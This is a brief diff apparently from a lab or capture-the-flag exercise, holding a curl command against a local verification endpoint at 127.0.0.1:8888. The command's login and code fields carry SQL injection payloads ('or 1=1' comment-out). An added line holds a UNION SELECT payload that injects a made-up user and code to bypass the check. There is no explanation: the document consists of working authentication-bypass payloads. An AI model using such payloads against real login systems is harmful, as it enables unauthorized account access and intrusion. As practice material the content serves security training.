@@ -1,1 +1,3 @@
 curl 'http://127.0.0.1:8888/api/auth/verification' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://127.0.0.1:8888/verification' -H 'Content-Type: application/json' -H 'Origin: http://127.0.0.1:8888' -H 'Connection: keep-alive' --data-raw $'{"login":"\' or 1=1 -- --","code":"\' or 1=1 -- --"}'
+
+{"login":"\' union select NULL, \'sasha\', \'1111\', NULL, NULL -- ","code":"1111"}'
